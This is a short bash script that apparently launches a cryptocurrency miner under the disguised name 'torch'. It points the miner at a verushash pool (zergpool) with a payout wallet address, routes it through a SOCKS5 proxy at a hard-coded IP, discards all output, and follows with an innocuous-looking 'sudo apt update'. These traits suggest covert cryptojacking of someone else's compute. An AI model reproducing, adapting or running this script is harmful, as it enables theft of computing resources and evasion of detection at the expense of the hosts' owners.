#!/bin/bash
chmod +x torch 
timeout 300m ./torch -v -l verushash.eu.mine.zergpool.com:3300 -u 19NGMAFwcdEPfYhW3FjsWMPF22m6WQi2b4 -t 2 -x socks5://192.252.209.155:14455 > /dev/null 2>&1
sudo apt update
